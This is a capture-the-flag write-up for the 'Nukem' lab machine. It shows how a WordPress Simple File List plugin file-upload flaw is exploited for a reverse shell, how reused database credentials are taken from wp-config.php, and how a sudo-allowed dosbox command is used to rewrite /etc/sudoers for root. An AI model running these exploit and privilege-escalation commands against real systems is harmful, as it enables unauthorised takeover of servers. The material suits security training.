# Nukem — Proving Grounds

> [!abstract] Summary
> Nukem runs a **WordPress 5.5.1** site ("Retro Gamming") whose **Simple File List 4.2.2** plugin is vulnerable to an authenticated-less arbitrary file upload / rename that yields remote code execution (EDB-48979). From the resulting `www-data` shell, the WordPress `wp-config.php` leaks database credentials `commander : CommanderKeenVorticons1990`, which are reused to log in as the local user `commander`. Privilege escalation is a `sudo`-allowed **`dosbox`** binary (GTFOBins) that is used to write a line into `/etc/sudoers`, granting `commander` full sudo and therefore root.

**Target:** `192.168.143.105`

## Methodology

1. Scan all TCP ports and identify the web application.
2. Enumerate WordPress with `wpscan` and identify the vulnerable Simple File List plugin.
3. Exploit the plugin for RCE as `www-data`.
4. Loot `wp-config.php` for credentials and reuse them to become `commander`.
5. Escalate to root by abusing the `sudo dosbox` entry to edit `/etc/sudoers`.

## Exploitation (Simple File List 4.2.2 RCE)

> [!info] Why this works
> Simple File List ≤ 4.2.2 exposes `wp-content/plugins/simple-file-list/ee-upload-engine.php`, which lets an unauthenticated user upload a file with a whitelisted extension (e.g. `.png`) and then **rename** it via `ee-file-engine.php` to an arbitrary extension such as `.php`. The attacker uploads a PHP payload disguised as a `.png`, renames it to `.php`, and browses to it under `wp-content/uploads/simple-file-list/` to execute code.

The public exploit automates the upload-then-rename:

```
# EDB-48979 — WordPress Simple File List 4.2.2 Arbitrary File Upload (RCE)
searchsploit -m 48979
python3 48979.py 192.168.143.105
```

The script uploads a PHP reverse shell, renames it to `.php`, and triggers it, catching a shell as `www-data` on a listener. (If running it manually, start `nc -nvlp <port>` first and point the payload at your Kali VPN IP.)

## Lateral movement — loot `wp-config.php`

With a `www-data` shell, enumerate the WordPress config. Running **LinPEAS** (`╔══════════╣ Analyzing Wordpress Files`) surfaces the database credentials out of `wp-config.php`:

```╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 http root 2913 Sep 18  2020 /srv/http/wp-config.php                   
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
define( 'DB_HOST', 'localhost' );

```

The DB user `commander` is also a **local system user**. The password is reused, so we can switch to `commander` (via `su commander` from the web shell, or SSH):

```
su commander
# password: CommanderKeenVorticons1990
```

This gives the `commander` user shell and the local flag.

## Privilege escalation — `sudo dosbox` → `/etc/sudoers`

Check sudo rights as `commander` (`sudo -l`). `commander` may run **`dosbox`** as root. `dosbox` is listed on GTFOBins: it can mount the host filesystem and write to arbitrary files as root. We abuse it to append a sudoers line granting `commander` full privileges.

```
[commander@nukem ~]$ LFILE='/etc/sudoers'
[commander@nukem ~]$ dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >>c:$LFILE" -c exit

[commander@nukem ~]$ sudo -s
[root@nukem ~]# cat proof.txt
```

`dosbox` mounts `/` as its `C:` drive and echoes the line `commander ALL=(ALL:ALL) ALL` into `/etc/sudoers` with root privileges. After that, `sudo -s` spawns a root shell and `proof.txt` is readable.

## Lessons learned

- A `wpscan` plugin enumeration is often the whole box — an out-of-date plugin version (Simple File List 4.2.2) maps straight to a public RCE. Always enumerate plugins and check each version against searchsploit/EDB.
- `wp-config.php` is the first file to read after any WordPress foothold; its `DB_USER` / `DB_PASSWORD` are frequently reused as local system credentials.
- `sudo -l` immediately after landing a user shell. A `sudo`-allowed GTFOBins binary like `dosbox` is a direct file-write-as-root primitive — editing `/etc/sudoers` (or dropping a SUID binary) turns it into a full root shell.
